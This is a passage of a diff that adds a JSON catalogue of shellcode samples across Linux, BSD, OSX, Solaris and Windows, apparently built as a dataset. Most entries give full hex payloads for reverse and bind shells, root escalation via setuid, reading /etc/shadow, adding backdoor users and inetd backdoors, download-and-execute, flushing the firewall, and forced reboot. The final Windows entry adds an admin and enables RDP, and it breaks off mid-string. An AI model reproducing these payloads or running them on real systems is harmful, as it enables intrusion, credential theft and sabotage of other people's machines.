+    "bytes_hex": "4831c0b0024831ffbb737764005348bb2f65746370617353488d3c244831f60f054889c34831c04889df4889e666baffff0f054989c04889e04831db53bb66696c655348bb2f746d706f7574534889c34831c0b002488d3c244831f66a66665e0f054889c74831c0b001488d334831d24c89c20f05",
+    "claimed_effect": "Reads data from -etc-passwd to -tmp-outfile",
+    "supported": true
+  },
+  {
+    "source_file": "Linux/x86-64/Reverse_TCP_shell.c",
+    "bucket": "hex",
+    "os": "Linux",
+    "arch": "x86-64",
+    "byte_count": 49,
+    "bytes_hex": "4831c04831ff4831f64831d24d31c06a025f6a015e6a065a6a29580f054989c04831f64d31d24152c604240266c7442402",
+    "claimed_effect": "Reverse TCP shell",
+    "supported": true
+  },
+  {
+    "source_file": "Linux/x86-64/Shutdown.c",
+    "bucket": "asm",
+    "os": "Linux",
+    "arch": "x86-64",
+    "byte_count": 0,
+    "bytes_hex": null,
+    "claimed_effect": "Shutdown",
+    "supported": false
+  },
+  {
+    "source_file": "Linux/x86-64/TCP_Bind_4444_with_password.c",
+    "bucket": "asm",
+    "os": "Linux",
+    "arch": "x86-64",
+    "byte_count": 0,
+    "bytes_hex": null,
+    "claimed_effect": "TCP Bind 4444 with password",
+    "supported": false
+  },
+  {
+    "source_file": "Linux/x86-64/TCP_bind_shell.c",
+    "bucket": "hex",
+    "os": "Linux",
+    "arch": "x86-64",
+    "byte_count": 48,
+    "bytes_hex": "4831c04831ff4831f64831d24d31c06a025f6a015e6a065a6a29580f054989c04d31d241524152c604240266c7442402",
+    "claimed_effect": "TCP bind shell",
+    "supported": true
+  },
+  {
+    "source_file": "Linux/x86-64/TCP_bind_shell_with_password.c",
+    "bucket": "hex",
+    "os": "Linux",
+    "arch": "x86-64",
+    "byte_count": 175,
+    "bytes_hex": "6a29586a025f6a015e990f0548974831c0894424fc66c74424fa115cc64424f8024883ec086a31584889e69980c2100f056a32580f056a2b584883ec104831f64889e6c64424ff104883ec01994889e20f054889c74831c0884424ff4883ec019952488d7424f080c2100f0548b8646f6f6d6564726157488d3e48af74074831c0043c0f055f6a035e48ffce6a21580f0575f65648bb2f62696e2f2f7368534889e7564889e2574889e66a3b580f05",
+    "claimed_effect": "TCP bind shell with password",
+    "supported": true
+  },
+  {
+    "source_file": "Linux/x86-64/TCP_reverse_shell_with_password.c",
+    "bucket": "hex",
+    "os": "Linux",
+    "arch": "x86-64",
+    "byte_count": 138,
+    "bytes_hex": "6a29586a025f6a015e990f054897c74424fcc0a8010966c74424fa115cc64424f8024883ec086a2a584889e66a105a0f056a035e48ffce6a21580f0575f64889c799884424ff4883ec0152488d7424f080c2100f0548b8646f6f6d6564726157488d3e48af74056a3c580f055f4831c048bb2f62696e2f2f7368534889e7504889e2574889e6043b0f05",
+    "claimed_effect": "TCP reverse shell with password",
+    "supported": true
+  },
+  {
+    "source_file": "Linux/x86-64/access()_Egghunter.c",
+    "bucket": "hex",
+    "os": "Linux",
+    "arch": "x86-64",
+    "byte_count": 0,
+    "bytes_hex": null,
+    "claimed_effect": "access() Egghunter",
+    "supported": false
+  },
+  {
+    "source_file": "Linux/x86-64/add_user_with_passwd.c",
+    "bucket": "asm",
+    "os": "Linux",
+    "arch": "x86-64",
+    "byte_count": 0,
+    "bytes_hex": null,
+    "claimed_effect": "add user with passwd",
+    "supported": false
+  },
+  {
+    "source_file": "Linux/x86-64/bind-shell_with_netcat.c",
+    "bucket": "asm",
+    "os": "Linux",
+    "arch": "x86-64",
+    "byte_count": 0,
+    "bytes_hex": null,
+    "claimed_effect": "bind-shell with netcat",
+    "supported": false
+  },
+  {
+    "source_file": "Linux/x86-64/connect_back_shell_with_netcat.c",
+    "bucket": "asm",
+    "os": "Linux",
+    "arch": "x86-64",
+    "byte_count": 0,
+    "bytes_hex": null,
+    "claimed_effect": "connect back shell with netcat",
+    "supported": false
+  },
+  {
+    "source_file": "Linux/x86-64/execve(-bin-sh);.c",
+    "bucket": "hex",
+    "os": "Linux",
+    "arch": "x86-64",
+    "byte_count": 30,
+    "bytes_hex": "4831d248bb2f2f62696e2f736848c1eb08534889e750574889e6b03b0f05",
+    "claimed_effect": "execve(-bin-sh);",
+    "supported": true
+  },
+  {
+    "source_file": "Linux/x86-64/execve(-bin-sh,_[-bin-sh],_NULL).c",
+    "bucket": "asm",
+    "os": "Linux",
+    "arch": "x86-64",
+    "byte_count": 0,
+    "bytes_hex": null,
+    "claimed_effect": "execve(-bin-sh, [-bin-sh], NULL)",
+    "supported": false
+  },
+  {
+    "source_file": "Linux/x86-64/execve(-sbin-iptables,_[-sbin-iptables,_-F],_NULL).c",
+    "bucket": "hex",
+    "os": "Linux",
+    "arch": "x86-64",
+    "byte_count": 49,
+    "bytes_hex": "4831c05066682d464889e148bbffff7461626c657348c1eb105348bb2f7362692f6970534889e75051574889e6b03b0f05",
+    "claimed_effect": "execve(-sbin-iptables, [-sbin-iptables, -F], NULL)",
+    "supported": true
+  },
+  {
+    "source_file": "Linux/x86-64/reboot(POWER_OFF).c",
+    "bucket": "hex",
+    "os": "Linux",
+    "arch": "x86-64",
+    "byte_count": 19,
+    "bytes_hex": "badcfe2143be69191228bfaddee1feb0a90f05",
+    "claimed_effect": "reboot(POWER OFF)",
+    "supported": true
+  },
+  {
+    "source_file": "Linux/x86-64/sethostname()_&_killall.c",
+    "bucket": "hex",
+    "os": "Linux",
+    "arch": "x86-64",
+    "byte_count": 33,
+    "bytes_hex": "b0aa49b8526f6f746564202141504889e740b6080f056a3e586aff5f6a095e0f05",
+    "claimed_effect": "sethostname() & killall",
+    "supported": true
+  },
+  {
+    "source_file": "Linux/x86-64/setreuid(0,0)_execve(-bin-ash,NULL,NULL)_+_XOR.c",
+    "bucket": "hex",
+    "os": "Linux",
+    "arch": "x86-64",
+    "byte_count": 85,
+    "bytes_hex": "4d31c041b17feb1a584831c94831db8a1c084c39c374104430cb881c0848ffc1ebede8e1ffffff374ebf37fcbf0e374e80374e89707a946f374ebf37fcbf4420374e89374ead707a9794808080501d1611501e0c17",
+    "claimed_effect": "setreuid(0,0) execve(-bin-ash,NULL,NULL) + XOR",
+    "supported": true
+  },
+  {
+    "source_file": "Linux/x86-64/setreuid(0,0)_execve(-bin-csh,_[-bin-csh,_NULL])_+_XOR.c",
+    "bucket": "hex",
+    "os": "Linux",
+    "arch": "x86-64",
+    "byte_count": 87,
+    "bytes_hex": "4d31c041b1e3eb1a584831c94831db8a1c084c39c374104430cb881c0848ffc1ebede8e1ffffffabd223ab602392abd21cabd215ece608f1abd223ab6023d8bcabd231b1b4ab6a05ece60b0a1c1c1ccc818a8dcc80908b",
+    "claimed_effect": "setreuid(0,0) execve(-bin-csh, [-bin-csh, NULL]) + XOR",
+    "supported": true
+  },
+  {
+    "source_file": "Linux/x86-64/setreuid(0,0)_execve(-bin-ksh,_[-bin-ksh,_NULL])_+_XOR.c",
+    "bucket": "hex",
+    "os": "Linux",
+    "arch": "x86-64",
+    "byte_count": 87,
+    "bytes_hex": "4d31c041b117eb1a584831c94831db8a1c084c39c374104430cb881c0848ffc1ebede8e1ffffff5f26d75f94d7665f26e85f26e11812fc055f26d75f94d72c485f26c545405f9ef11812fffee8e8e838757e79387c647f",
+    "claimed_effect": "setreuid(0,0) execve(-bin-ksh, [-bin-ksh, NULL]) + XOR",
+    "supported": true
+  },
+  {
+    "source_file": "Linux/x86-64/setreuid(0,0)_execve(-bin-zsh,_[-bin-zsh,_NULL])_+_XOR.c",
+    "bucket": "hex",
+    "os": "Linux",
+    "arch": "x86-64",
+    "byte_count": 87,
+    "bytes_hex": "4d31c041b13ceb1a584831c94831db8a1c084c39c374104430cb881c0848ffc1ebede8e1ffffff740dfc74bffc4d740dc3740dca3339d72e740dfc74bffc0763740dee6e6b74b5da3339d4d5c3c3c3135e555213464f54",
+    "claimed_effect": "setreuid(0,0) execve(-bin-zsh, [-bin-zsh, NULL]) + XOR",
+    "supported": true
+  },
+  {
+    "source_file": "Linux/x86-64/setuid(0)_&_chmod_(-etc-passwd,_0777)_&_exit(0).c",
+    "bucket": "hex",
+    "os": "Linux",
+    "arch": "x86-64",
+    "byte_count": 63,
+    "bytes_hex": "4831ff4831c0b0690f054831d266beff0148bbffffffffff646f7748c1eb285348bb2f6574632f736861534889e74831c0b05a0f054831ff4831c0b03c0f05",
+    "claimed_effect": "setuid(0) & chmod (-etc-passwd, 0777) & exit(0)",
+    "supported": true
+  },
+  {
+    "source_file": "Linux/x86-64/setuid(0)_&_reboot.c",
+    "bucket": "hex",
+    "os": "Linux",
+    "arch": "x86-64",
+    "byte_count": 51,
+    "bytes_hex": "4831ffb0690f054831d248bbffffffff626f6f7448c1eb205348bb2f7362696e2f7265534889e74831c050574889e6b03b0f05",
+    "claimed_effect": "setuid(0) & reboot",
+    "supported": true
+  },
+  {
+    "source_file": "Linux/x86-64/setuid(0)_+_execve(-bin-sh)_49_bytes.c",
+    "bucket": "hex",
+    "os": "Linux",
+    "arch": "x86-64",
+    "byte_count": 48,
+    "bytes_hex": "4831ffb0690f054831d248bbff2f62696e2f736848c1eb08534889e74831c050574889e6b03b0f056a015f6a3c580f05",
+    "claimed_effect": "setuid(0) + execve(-bin-sh) 49 bytes",
+    "supported": true
+  },
+  {
+    "source_file": "Linux/x86-64/shell_bind_TCP_random_port.c",
+    "bucket": "hex",
+    "os": "Linux",
+    "arch": "x86-64",
+    "byte_count": 57,
+    "bytes_hex": "4831f648f7e6ffc66a025fb0290f05525e505fb0320f05b02b0f05575e4897ffceb0210f0575f85248bf2f2f62696e2f736857545fb03b0f05",
+    "claimed_effect": "shell bind TCP random port",
+    "supported": true
+  },
+  {
+    "source_file": "Linux/x86-64/shutdown_-h_now.c",
+    "bucket": "hex",
+    "os": "Linux",
+    "arch": "x86-64",
+    "byte_count": 65,
+    "bytes_hex": "4831c04831d2506a7766686e6f4889e35066682d684889e15049b82f7362696e2f2f2f49ba73687574646f776e415241504889e7525351574889e64883c03b0f05",
+    "claimed_effect": "shutdown -h now",
+    "supported": true
+  },
+  {
+    "source_file": "NetBSD/x86/callback_(port_6666).c",
+    "bucket": "hex",
+    "os": "NetBSD",
+    "arch": "x86",
+    "byte_count": 83,
+    "bytes_hex": "31c031c9504050405050b061cd8089c389e24951514168f5fffffd68fffde5f5b11051f6124ae2fbf612525050b062cd80b1034951415350b05acd80e2f551682f2f7368682f62696e89e351545350b03bcd80",
+    "claimed_effect": "callback (port 6666)",
+    "supported": true
+  },
+  {
+    "source_file": "NetBSD/x86/execve(-bin-sh).c",
+    "bucket": "hex",
+    "os": "NetBSD",
+    "arch": "x86",
+    "byte_count": 61,
+    "bytes_hex": "eb235e8d1e895e0b31d289560789560f89561488561931c0b03b8d4e0b89ca52515350eb18e8d8ffffff0101010102020202030303039a040404040704",
+    "claimed_effect": "execve(-bin-sh)",
+    "supported": true
+  },
+  {
+    "source_file": "NetBSD/x86/kill_all_processes_shellcode.c",
+    "bucket": "asm",
+    "os": "NetBSD",
+    "arch": "x86",
+    "byte_count": 0,
+    "bytes_hex": null,
+    "claimed_effect": "kill all processes shellcode",
+    "supported": false
+  },
+  {
+    "source_file": "NetBSD/x86/setreuid(0,_0);_execve(-bin--sh,_...,_NULL);.c",
+    "bucket": "hex",
+    "os": "NetBSD",
+    "arch": "x86",
+    "byte_count": 29,
+    "bytes_hex": "995252526a7e58cd80682f2f7368682f62696e89e352545352343bcd80",
+    "claimed_effect": "setreuid(0, 0); execve(-bin--sh, ..., NULL);",
+    "supported": true
+  },
+  {
+    "source_file": "OpenBSD/x86/add_user_w00w00.c",
+    "bucket": "hex",
+    "os": "OpenBSD",
+    "arch": "x86",
+    "byte_count": 112,
+    "bytes_hex": "eb2b5e31c088460b88462950b0095031c05650b005cd8089c36a1d8d460c50535031c0b004cd8031c0b001cd80e8d0ffffff2f746d702f706173737764307730307730303a3a303a303a7730307730303a2f3a2f62696e2f73680a30ffffffffffffffffffffffffffffffffffffffff",
+    "claimed_effect": "add user w00w00",
+    "supported": true
+  },
+  {
+    "source_file": "OpenBSD/x86/execve(-bin-sh).c",
+    "bucket": "hex",
+    "os": "OpenBSD",
+    "arch": "x86",
+    "byte_count": 23,
+    "bytes_hex": "9952686e2f7368682f2f626989e3525453536a3b58cd80",
+    "claimed_effect": "execve(-bin-sh)",
+    "supported": true
+  },
+  {
+    "source_file": "OpenBSD/x86/portbind_port_6969.c",
+    "bucket": "other",
+    "os": "OpenBSD",
+    "arch": "x86",
+    "byte_count": 0,
+    "bytes_hex": null,
+    "claimed_effect": "portbind port 6969",
+    "supported": false
+  },
+  {
+    "source_file": "OpenBSD/x86/reboot().c",
+    "bucket": "hex",
+    "os": "OpenBSD",
+    "arch": "x86",
+    "byte_count": 15,
+    "bytes_hex": "31c066ba0e276681ea0627b037cd80",
+    "claimed_effect": "reboot()",
+    "supported": true
+  },
+  {
+    "source_file": "Osx/ppc/Add_user_r00t.c",
+    "bucket": "hex",
+    "os": "Osx",
+    "arch": "ppc",
+    "byte_count": 219,
+    "bytes_hex": "7ca52a794082fffd7d4802a63bea017039600170391fff0d7ca829ae387fff043880020138a0ffff380bfe9544ffff0260606060389fff0e38abfee5380bfe9444ffff0260606060380bfe9644ffff02606060607ca52a79387fff049061fff890a1fffc3881fff8380bfecb44ffff0260606060380bfe9144ffff022f746d702f782e73685823212f62696e2f73680a2f62696e2f6563686f2027723030743a3a3939393a38303a3a303a303a723030743a2f3a2f62696e2f736827207c202f7573722f62696e2f6e696c6f6164202d6d20706173737764202e0a",
+    "claimed_effect": "Add user r00t",
+    "supported": true
+  },
+  {
+    "source_file": "Osx/ppc/Bind_Shell_PORT_TCP-8000.c",
+    "bucket": "other",
+    "os": "Osx",
+    "arch": "ppc",
+    "byte_count": 0,
+    "bytes_hex": null,
+    "claimed_effect": "Bind Shell PORT TCP-8000",
+    "supported": false
+  },
+  {
+    "source_file": "Osx/ppc/Single_Reverse_TCP.c",
+    "bucket": "other",
+    "os": "Osx",
+    "arch": "ppc",
+    "byte_count": 0,
+    "bytes_hex": null,
+    "claimed_effect": "Single Reverse TCP",
+    "supported": false
+  },
+  {
+    "source_file": "Osx/ppc/add_inetd_backdoor.c",
+    "bucket": "hex",
+    "os": "Osx",
+    "arch": "ppc",
+    "byte_count": 222,
+    "bytes_hex": "7ca52a794082fffd7d4802a63bea017039600170391fff1b7ca829ae391fff657ca829ae387fff0c388bfe9938a0ffff380bfe9544ffff0260606060389fff1c38abfeca380bfe9444ffff0260606060380bfe9644ffff02606060607ca52a79387fff569061fff890a1fffc3881fff8380bfecb44ffff0260606060380bfe9144ffff022f6574632f696e6574642e636f6e66580a61636d736f64612073747265616d20746370206e6f7761697420726f6f74202f7573722f6c6962657865632f74637064202f62696e2f73680a2f7573722f7362696e2f696e65746458",
+    "claimed_effect": "add inetd backdoor",
+    "supported": true
+  },
+  {
+    "source_file": "Osx/ppc/create_-tmp-suid.c",
+    "bucket": "hex",
+    "os": "Osx",
+    "arch": "ppc",
+    "byte_count": 122,
+    "bytes_hex": "7ca52a794082fffd7fe802a6391f01713908fef47ca829ae387f01683863fef43880020138a0ffff39400170380afe9544ffff0260606060389f01723884fef438aafe9c380afe9444ffff0260606060380afe9644ffff0260606060380afe9144ffff022f746d702f737569645823212f62696e2f73680a7368",
+    "claimed_effect": "create -tmp-suid",
+    "supported": true
+  },
+  {
+    "source_file": "Osx/ppc/execve(-bin-sh,[-bin-sh],NULL)&_exit().c",
+    "bucket": "hex",
+    "os": "Osx",
+    "arch": "ppc",
+    "byte_count": 72,
+    "bytes_hex": "7ca52a794082fffd7d6802a63beb017139400171391ffece7ca829ae387ffec79061fff890a1fffc3881fff8380afeca44ffff0260606060380afe9044ffff022f62696e2f736854",
+    "claimed_effect": "execve(-bin-sh,[-bin-sh],NULL)& exit()",
+    "supported": true
+  },
+  {
+    "source_file": "Osx/ppc/remote_findsock_by_recv()_key_shellcode.c",
+    "bucket": "other",
+    "os": "Osx",
+    "arch": "ppc",
+    "byte_count": 0,
+    "bytes_hex": null,
+    "claimed_effect": "remote findsock by recv() key shellcode",
+    "supported": false
+  },
+  {
+    "source_file": "Osx/ppc/shellcode_execve(-bin-sh).c",
+    "bucket": "other",
+    "os": "Osx",
+    "arch": "ppc",
+    "byte_count": 0,
+    "bytes_hex": null,
+    "claimed_effect": "shellcode execve(-bin-sh)",
+    "supported": false
+  },
+  {
+    "source_file": "Osx/ppc/stager_sock_find.c",
+    "bucket": "other",
+    "os": "Osx",
+    "arch": "ppc",
+    "byte_count": 0,
+    "bytes_hex": null,
+    "claimed_effect": "stager sock find",
+    "supported": false
+  },
+  {
+    "source_file": "Osx/ppc/stager_sock_find_peek.c",
+    "bucket": "other",
+    "os": "Osx",
+    "arch": "ppc",
+    "byte_count": 0,
+    "bytes_hex": null,
+    "claimed_effect": "stager sock find peek",
+    "supported": false
+  },
+  {
+    "source_file": "Osx/ppc/stager_sock_reverse.c",
+    "bucket": "other",
+    "os": "Osx",
+    "arch": "ppc",
+    "byte_count": 0,
+    "bytes_hex": null,
+    "claimed_effect": "stager sock reverse",
+    "supported": false
+  },
+  {
+    "source_file": "Osx/ppc/sync(),_reboot().c",
+    "bucket": "hex",
+    "os": "Osx",
+    "arch": "ppc",
+    "byte_count": 32,
+    "bytes_hex": "7c631a7939400106380aff1e44ffff026060606039400119380aff1e44ffff02",
+    "claimed_effect": "sync(), reboot()",
+    "supported": true
+  },
+  {
+    "source_file": "Osx/x86/execve(-bin-sh).c",
+    "bucket": "hex",
+    "os": "Osx",
+    "arch": "x86",
+    "byte_count": 24,
+    "bytes_hex": "31c050682f2f7368682f62696e89e3505053b03b6a2acd80",
+    "claimed_effect": "execve(-bin-sh)",
+    "supported": true
+  },
+  {
+    "source_file": "Osx/x86-64/reverse_tcp_shellcode.c",
+    "bucket": "asm",
+    "os": "Osx",
+    "arch": "x86-64",
+    "byte_count": 0,
+    "bytes_hex": null,
+    "claimed_effect": "reverse tcp shellcode",
+    "supported": false
+  },
+  {
+    "source_file": "Osx/x86-64/setuid_shell_x86_64.c",
+    "bucket": "hex",
+    "os": "Osx",
+    "arch": "x86-64",
+    "byte_count": 51,
+    "bytes_hex": "41b00249c1e0184983c81731ff4c89c00f05eb125f4983c0244c89c04831d252574889e60f05e8e9ffffff2f62696e2f2f7368",
+    "claimed_effect": "setuid shell x86 64",
+    "supported": true
+  },
+  {
+    "source_file": "Osx/x86-64/universal_OSX_dyld_ROP_shellcode.c",
+    "bucket": "asm",
+    "os": "Osx",
+    "arch": "x86-64",
+    "byte_count": 0,
+    "bytes_hex": null,
+    "claimed_effect": "universal OSX dyld ROP shellcode",
+    "supported": false
+  },
+  {
+    "source_file": "Osx/x86-64/universal_ROP_shellcode.c",
+    "bucket": "asm",
+    "os": "Osx",
+    "arch": "x86-64",
+    "byte_count": 0,
+    "bytes_hex": null,
+    "claimed_effect": "universal ROP shellcode",
+    "supported": false
+  },
+  {
+    "source_file": "Solaris/mips/connect-back_(with_XNOR_encoded_session).c",
+    "bucket": "hex",
+    "os": "Solaris",
+    "arch": "mips",
+    "byte_count": 596,
+    "bytes_hex": "1304bdd09332600cd223bfd4131b5c0b92126350d223bfd8c023bfdc20bfffff20bfffff7fffffff9e03e09020bffffb81c3e004961ac00b81c3ff1c92102002941a800a961ac00b98102001821020e691d02008801ac00b81c3e008801ac00b8210200291d02008961ac00b8092c00912bffff0961ac00b7ffffff190102001d023bfcce003bfcc9003bfd68210200a91d02008d003bfcc9203bfd49410200896102003981ac00b821020e891d02008d003bfcc9210200194102001821020e991d02008d003bfcc9203bfd494102028d423bfd09403bfd096102001821020ea91d02008d023bfcc94102001921020098210203e91d02008d003bfcc9422c00b91d02008d003bfcc9410200291d02008941a800a210bd89aa014216e230bcbdca2146368d423bfd0e223bfcce023bfc89023a038d423bfc4d023bfc09223a0408210200b91d0200890102003d023bff89003bff8921a4009821020c791d020087fffffb79010200180184002d023bf809203bfd494102008821020eb91d020087fffffaf90102002d023bff8130ab6489332600cd223bfec1324289e921260d7d223bff0c023bff49203bfec94102010821020eb91d02008e403bff8e203bf80e223bff8e423bf8094102001912aa010d023bffc9003bff892102001843ac00b8210205791d020089218400180a2400802bffff2d003bff89203bf88941020648210200391d020089218400180a2400802bfffea92103f9c9e03bfecd603c0098222c00b963ac001d623c00980a2400112bffffb92026004940a3fffd003bf809203bf888210200491d0200810bfffdb80184002",
+    "claimed_effect": "connect-back (with XNOR encoded session)",
+    "supported": true
+  },
+  {
+    "source_file": "Solaris/mips/download_and_execute.c",
+    "bucket": "hex",
+    "os": "Solaris",
+    "arch": "mips",
+    "byte_count": 278,
+    "bytes_hex": "a61ac00b20bfffff20bfffff7fffffff9010200292102002941a800a961ac00b98102001821020e691d02008c02be0a6d023bffc92203ffe932a601092227fb0d223bfec1337ab6f921262efd223bff0c023bff49203bfec94102010821020eb91d02008c02be10e9203e0fc94203ff2d003bffc8210200491d02008c02be0fb9003e0f494203c1392203efe8210200591d02008d023bff8d003bffc9203bfc4941020148210200391d02008a4a4c0080280ff06940a3fffd003bff88210200491d0200810bffff5941a800ad423e0fcd423e0f09003e0f4d023e0ec9203e0ec8210200b91d020086f6d666720736f6c61726973207368656c6c636f64657a212f746d702f717141474554202f6576696c2d646c0a0a",
+    "claimed_effect": "download and execute",
+    "supported": true
+  },
+  {
+    "source_file": "Solaris/sparc/Bind_-bin-sh_TCP_port_2001.c",
+    "bucket": "other",
+    "os": "Solaris",
+    "arch": "sparc",
+    "byte_count": 0,
+    "bytes_hex": null,
+    "claimed_effect": "Bind -bin-sh TCP port 2001",
+    "supported": false
+  },
+  {
+    "source_file": "Solaris/sparc/Single_bind_TCP_shell.c",
+    "bucket": "other",
+    "os": "Solaris",
+    "arch": "sparc",
+    "byte_count": 0,
+    "bytes_hex": null,
+    "claimed_effect": "Single bind TCP shell",
+    "supported": false
+  },
+  {
+    "source_file": "Solaris/sparc/execve(-bin-sh).c",
+    "bucket": "hex",
+    "os": "Solaris",
+    "arch": "sparc",
+    "byte_count": 40,
+    "bytes_hex": "20bfffff20bfffff7fffffff9003e02092022010c0222008d0222010c02220148210200b91d02008",
+    "claimed_effect": "execve(-bin-sh)",
+    "supported": true
+  },
+  {
+    "source_file": "Solaris/sparc/setreuid(geteuid()),_setregid(getegid()),_execve_-bin-sh.c",
+    "bucket": "hex",
+    "os": "Solaris",
+    "arch": "sparc",
+    "byte_count": 120,
+    "bytes_hex": "8210201891d02008900260019022200192103fff821020ca91d020088210202f91d02008900260019022200192103fff821020cb91d02008941a800a210bd89aa014216e230bcbdca2146368d423bffce223bff8e023bff49023a00cd423bff0d023bfec9223a0148210203b91d020088210200191d02008",
+    "claimed_effect": "setreuid(geteuid()), setregid(getegid()), execve -bin-sh",
+    "supported": true
+  },
+  {
+    "source_file": "Solaris/sparc/setreuid_.c",
+    "bucket": "hex",
+    "os": "Solaris",
+    "arch": "sparc",
+    "byte_count": 56,
+    "bytes_hex": "901a4009921a4009821020ca91d02008210bd89aa014216e230bdcdae03bbff09023a010d023bff89223a008941a800a8210203b91d02008",
+    "claimed_effect": "setreuid",
+    "supported": true
+  },
+  {
+    "source_file": "Solaris/x86/Halt_shellcode.c",
+    "bucket": "hex",
+    "os": "Solaris",
+    "arch": "x86",
+    "byte_count": 36,
+    "bytes_hex": "31d25266686c74686e2f6861682f736269682f75737289e3525389e1525153b03b52cd91",
+    "claimed_effect": "Halt shellcode",
+    "supported": true
+  },
+  {
+    "source_file": "Solaris/x86/Reboot().c",
+    "bucket": "hex",
+    "os": "Solaris",
+    "arch": "x86",
+    "byte_count": 37,
+    "bytes_hex": "31c05068626f6f74686e2f7265682f736269682f75737289e3505389e1505153b00b50cd91",
+    "claimed_effect": "Reboot()",
+    "supported": true
+  },
+  {
+    "source_file": "Solaris/x86/Remote_Download_file.c",
+    "bucket": "hex",
+    "os": "Solaris",
+    "arch": "x86",
+    "byte_count": 79,
+    "bytes_hex": "31d2526a736668726968736f6c6168706c652d686578656d686f72672f686f726d2e686c2d7374687368656c89e1526a74682f776765682f62696e682f75737289e352515389e1525153b03b52cd91",
+    "claimed_effect": "Remote Download file",
+    "supported": true
+  },
+  {
+    "source_file": "Solaris/x86/Sync()_&_reboot()_&_exit(0).c",
+    "bucket": "hex",
+    "os": "Solaris",
+    "arch": "x86",
+    "byte_count": 48,
+    "bytes_hex": "31c0b024cd9131c05068626f6f74686e2f7265682f736269682f75737289e3505389e1505153b00b50cd9131dbb0cd91",
+    "claimed_effect": "Sync() & reboot() & exit(0)",
+    "supported": true
+  },
+  {
+    "source_file": "Solaris/x86/SystemV_killall_command.c",
+    "bucket": "hex",
+    "os": "Solaris",
+    "arch": "x86",
+    "byte_count": 39,
+    "bytes_hex": "31c0506a6c686c6c616c686e2f6b69682f736269682f75737289e3505389e2505253b03b50cd91",
+    "claimed_effect": "SystemV killall command",
+    "supported": true
+  },
+  {
+    "source_file": "Solaris/x86/add_services_and_execve_inetd.c",
+    "bucket": "hex",
+    "os": "Solaris",
+    "arch": "x86",
+    "byte_count": 95,
+    "bytes_hex": "eb3d9a242424240724c35e29c08946bf8846c489460c88461788461a88467829c050568d5e10891e538d5e18895e048d5e1b895e08b03be8c6ffffffffffffe8c6ffffff010101010202020203030303040404042f62696e2f7368202d6320",
+    "claimed_effect": "add services and execve inetd",
+    "supported": true
+  },
+  {
+    "source_file": "Solaris/x86/execve(-bin-sh,_-bin-sh,_NULL).c",
+    "bucket": "hex",
+    "os": "Solaris",
+    "arch": "x86",
+    "byte_count": 27,
+    "bytes_hex": "31c050686e2f7368682f2f626989e3505389e2505253b03b50cd91",
+    "claimed_effect": "execve(-bin-sh, -bin-sh, NULL)",
+    "supported": true
+  },
+  {
+    "source_file": "Solaris/x86/execve_-bin-sh.c",
+    "bucket": "hex",
+    "os": "Solaris",
+    "arch": "x86",
+    "byte_count": 41,
+    "bytes_hex": "b8fff8ff3cf7d05031c0b09a5089e531c050682f2f7368682f62696e89e3505389e2505253b03bffd5",
+    "claimed_effect": "execve -bin-sh",
+    "supported": true
+  },
+  {
+    "source_file": "Solaris/x86/execve_-bin-sh_toupper_evasion.c",
+    "bucket": "hex",
+    "os": "Solaris",
+    "arch": "x86",
+    "byte_count": 84,
+    "bytes_hex": "eb335e8d0629c989f3895e08b10780032043e0fa9329c0895e0b29d288561989560789560f895614b03b8d4e0b89ca52515350eb18e8c8ffffff0f42494e0f53480101010102020202030303039a040404040704",
+    "claimed_effect": "execve -bin-sh toupper evasion",
+    "supported": true
+  },
+  {
+    "source_file": "Solaris/x86/setuid(0)&execve;(--bin-sh)&exit;(0).c",
+    "bucket": "hex",
+    "os": "Solaris",
+    "arch": "x86",
+    "byte_count": 38,
+    "bytes_hex": "31c05050b017cd9150686e2f7368682f2f626989e3505389e2505253b03b50cd91405050cd91",
+    "claimed_effect": "setuid(0)&execve;(--bin-sh)&exit;(0)",
+    "supported": true
+  },
+  {
+    "source_file": "Solaris/x86/setuid(0)&execve;(-bin-cat,_-etc-shadow)&exit;(0).c",
+    "bucket": "hex",
+    "os": "Solaris",
+    "arch": "x86",
+    "byte_count": 58,
+    "bytes_hex": "31c05050b017cd91eb205e50682f636174682f62696e89e350565389e2505253b03b50cd91405050cd91e8dbffffff2f6574632f736861646f77",
+    "claimed_effect": "setuid(0)&execve;(-bin-cat, -etc-shadow)&exit;(0)",
+    "supported": true
+  },
+  {
+    "source_file": "Solaris/x86/setuid(0)__-bin-cat_--etc-shadow__.c",
+    "bucket": "hex",
+    "os": "Solaris",
+    "arch": "x86",
+    "byte_count": 61,
+    "bytes_hex": "33c05050b017cd9133d2526861646f7768632f7368682f2f65748bcc52682f636174682f62696e8bdc5251538bcc525153b03b52cd9133c050b001cd91",
+    "claimed_effect": "setuid(0) -bin-cat --etc-shadow",
+    "supported": true
+  },
+  {
+    "source_file": "Windows/Add_Admin,_enable_RDP,_stop_firewall_and_start_terminal_service.c",
+    "bucket": "hex",
+    "os": "Windows",
+    "arch": null,
+    "byte_count": 1218,
+    "bytes_hex": "31c050b841414164c1e808c1e808c1e80850b96d765352ba4d59323631d151b96e726171ba4e332d3831d151b96c757878ba4c34343131d151b946475746ba3334323431d151b956504764ba3835334431d15189e0bb41414101c1eb08c1eb08c1eb085350bba6b4022fba3352645931d3ffd331c050684141646458c1e808c1e80850b901416032ba48614f5331d151b928470d2fba5b674c6331d151b903243621ba6250595331d151b934411518ba5d32616a31d151b90c051b25ba6868724b31d151b92f277b13ba5a575b5231d151b91c2c023eba704b705131d151b93d2a324cba5145512d31d151b9235c1c19ba4d39683931d15189e0bb41414101c1eb08c1eb08c1eb085350bba6b4022fba3352645931d3ffd331c050684141646458c1e808c1e80850b902636b35ba4b43445431d151b961556c3dba43752d7131d151b9273f3b1aba545a496931d151b925341267ba4a44323231d151b90b021f19ba6e71746d31d151b9393f7b15ba4d5a5b5131d151b93515032aba67706e4531d151b93a177546ba6f47556431d151b926350b1eba6a72595131d151b92a2a062aba6665456b31d151b91d20355aba5365617a31d15189e0bb41414101c1eb08c1eb08c1eb085350bba6b4022fba3352645931d3ffd331c050b9094c7c5eba386c533831d151b9424d3914ba62625d3431d151b97a242675ba2d6b743131d151b91d301528ba58774a6c31d151b97c2f5716ba535b774431d151b942252a66ba2d4b594631d151b9282f0c5aba4d4c783331d151b9202b2626ba6344484831d151b9082b2367ba6652773431d151b9491c2e48ba697a6a2d31d151b967671d37ba4547324131d151b903330d3bba7145684931d151b9396a3c2fba554a6f4a31d151b937441f2eba5a2d714f31d151b93423233bba6877464931d151b9073a0a14ba7348657831d151b9142e5853ba486d373d31d151b93e3d2632ba526e434631d151b9333c3534ba5d48475b31d151b9360e072bba587a444431d151b93c100a37ba4962785231d151b9247c3b36ba6131677531d151b9313d3b27ba6264687331d151b97f7d3d